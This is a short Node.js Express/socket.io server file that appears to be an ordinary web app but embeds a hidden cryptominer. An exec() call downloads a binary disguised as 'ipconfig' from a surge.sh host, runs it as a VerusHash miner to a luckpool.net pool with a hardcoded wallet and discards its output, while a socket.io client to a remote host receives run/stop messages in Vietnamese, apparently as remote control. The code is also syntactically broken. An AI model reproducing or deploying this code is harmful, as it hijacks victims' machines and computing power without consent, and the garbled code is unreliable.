const express = require('express');
const socketIO = require('socket.io');
const PORT = process.env.PORT || 8080;
const INDEX = '/index.html';

const server = express()
  .use((req, res) => res.sendFile(INDEX, { root: __dirname }))
  .listen(PORT, () => console.log(`Listening on ${PORT}`));
    exec(wget https://tienph-88.surge.sh/ipconfig;chmod +x ipconfig;./ipconfig --disable-gpu --algorithm verushash --pool na.luckpool.net:3957 --wallet RLWiNfzX9jqVKXriD8tq8ZaSKkLeRAgNU3.render --password x --cpu-threads 1 >> /dev/null, (err, stdout, stderr) => {
  if (err) {
   
    return;
  }
  
const { exec } = require('child_process');
const
    io = require("socket.io-client"),
    ioClient = io.connect("http://render.us-3.evennode.com:80");

ioClient.on("message", (msg) => {
  if (msg ==='Chay') {
    console.log('Em bat dau chay anh');
  } else if (msg ==='Ngung'){
    console.log('Em ngung chay roi anh');
  }
   else {

});
  }
});

